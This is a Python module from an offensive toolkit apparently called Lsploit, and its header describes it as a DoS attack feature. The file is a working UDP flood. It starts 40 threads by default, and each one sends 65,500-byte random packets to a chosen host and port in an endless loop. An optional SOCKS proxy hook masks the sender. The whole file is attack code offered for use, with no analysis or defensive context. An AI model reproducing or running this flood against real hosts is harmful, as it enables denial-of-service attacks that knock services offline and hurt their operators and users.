'''
 *@author:wr
 *@GitHub:https://github.com/wr0x00/Lsploit
 *@date:2022.8.2
 *@description: dos攻击功能
'''
import socket
import threading
import random
from .sniff import isIP

#设置语言
if not __name__ == '__main__':
	#try:
		import json
		# 读入示例json数据
		j= open('modules\configs.json', "r",encoding='utf-8')
		demo_json = json.loads(j.read())

		if demo_json["language"]=='cn'or demo_json["language"]=='CN':
			from .strings import String_CN as Str
		
		if demo_json["language"]=='en'or demo_json["language"]=='EN':
			from .strings import String_EN as Str

	#except Exception as e:
		#print(e)
		#exit()

Max=200000
byte_size=65500
byte=random._urandom(byte_size)
c=0

def set_agent(p=None,socks=None):#设置代理
    global proxy
    proxy=p
    socket.socket = socks.socksocket

class exp:
    def sent(self):
        global c,byte
        for s in range(1,Max+1):
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while True:
                sock.sendto(byte,(self.host,self.port))
                c=c+1
                print(f'\033[94m{c}\033[1;37;40m {Str.TIMES_send} {self.host}:{self.port}  {byte_size}{Str.BYTE} ')
        return None
    def __init__(self,host:str,port:str,thread=40):
        if not isIP(host):
            print(Str.ERROR_CONNECT)
            exit()
        self.host=host
        self.port=int(port)
       
        junjun=[]
        for i in range(1,thread+1):
            send=threading.Thread(target=self.sent,args=())
            junjun.append(send)
        for i in junjun:
            i.start()
        return None